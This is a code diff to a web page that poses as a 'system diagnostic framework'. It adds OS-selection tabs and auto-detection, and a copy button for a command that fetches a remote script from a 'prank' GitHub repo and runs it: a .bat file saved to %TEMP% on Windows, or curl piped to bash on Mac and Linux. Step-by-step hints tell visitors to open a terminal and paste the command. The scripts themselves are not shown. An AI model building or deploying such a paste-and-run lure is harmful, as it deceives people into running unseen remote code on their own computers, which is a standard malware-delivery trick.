@@ -144,6 +144,31 @@
   .dt-row span.ok {
     color: #00e650;
   }
+  .os-tabs {
+    display: flex;
+    gap: 8px;
+    margin-top: 16px;
+    margin-bottom: 6px;
+  }
+  .os-tab {
+    flex: 1;
+    background: #080d0a;
+    border: 1px solid #1a3320;
+    color: #557760;
+    padding: 8px 12px;
+    font-family: inherit;
+    font-size: 12px;
+    font-weight: bold;
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.2s;
+  }
+  .os-tab.active {
+    background: #0f1c14;
+    border-color: #00e650;
+    color: #00e650;
+    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
+  }
   .cmd-box {
     background: #040608;
     border: 1px solid #1a3320;
@@ -152,7 +177,7 @@
     font-family: Consolas, "Courier New", monospace;
     font-size: 13px;
     padding: 14px;
-    margin: 14px 0;
+    margin: 10px 0 14px 0;
     line-height: 1.4;
     word-break: break-all;
     -webkit-user-select: all;
@@ -207,15 +232,18 @@
     <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
     <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
     <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>
-    <div class="dt-row" style="margin-top: 16px; color: #ffd228; font-weight: bold;">
-      &gt; PASTE THIS COMMAND INTO YOUR TERMINAL TO RUN:
+
+    <!-- OS Selection Tabs -->
+    <div class="os-tabs">
+      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
+      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
     </div>
     
     <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\launch.bat" &amp;&amp; "%TEMP%\launch.bat"</div>
 
     <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>
 
-    <div class="cmd-hint">
+    <div class="cmd-hint" id="cmd-hint">
       &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
       &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
     </div>
@@ -1123,13 +1151,58 @@ window.addEventListener("DOMContentLoaded", () => {
     const sfx = new WebSFX();
     const prank = new WebChaosPrank(canvas, sfx);
 
+    const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
+    const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';
+
+    const tabWin = document.getElementById("tab-win");
+    const tabUnix = document.getElementById("tab-unix");
+    const cmdDisplay = document.getElementById("cmd-display");
+    const cmdHint = document.getElementById("cmd-hint");
     const copyBtn = document.getElementById("btn-copy");
-    const cmdStr = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
+
+    let currentCmd = WIN_CMD;
+
+    function setTab(os) {
+      if (os === "unix") {
+        tabUnix.classList.add("active");
+        tabWin.classList.remove("active");
+        currentCmd = UNIX_CMD;
+        cmdDisplay.textContent = UNIX_CMD;
+        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
+      } else {
+        tabWin.classList.add("active");
+        tabUnix.classList.remove("active");
+        currentCmd = WIN_CMD;
+        cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\launch.bat" && "%TEMP%\launch.bat"';
+        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
+      }
+    }
+
+    tabWin.addEventListener("click", () => {
+      sfx.init(); sfx.blip();
+      setTab("win");
+    });
+
+    tabUnix.addEventListener("click", () => {
+      sfx.init(); sfx.blip();
+      setTab("unix");
+    });
+
+    // Auto-detect Mac / Linux
+    const plat = navigator.platform || '';
+    const ua = navigator.userAgent || '';
+    if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {
+      setTab("unix");
+    } else {
+      setTab("win");
+    }
+
     copyBtn.addEventListener("click", () => {
       sfx.init();
       sfx.blip();
+      const textToCopy = currentCmd;
       if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(cmdStr).then(() => {
+        navigator.clipboard.writeText(textToCopy).then(() => {
           copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
           copyBtn.style.background = "#00e650";
           copyBtn.style.color = "#040608";
@@ -1141,7 +1214,7 @@ window.addEventListener("DOMContentLoaded", () => {
         });
       } else {
         const ta = document.createElement("textarea");
-        ta.value = cmdStr;
+        ta.value = textToCopy;
         document.body.appendChild(ta);
         ta.select();
         document.execCommand("copy");
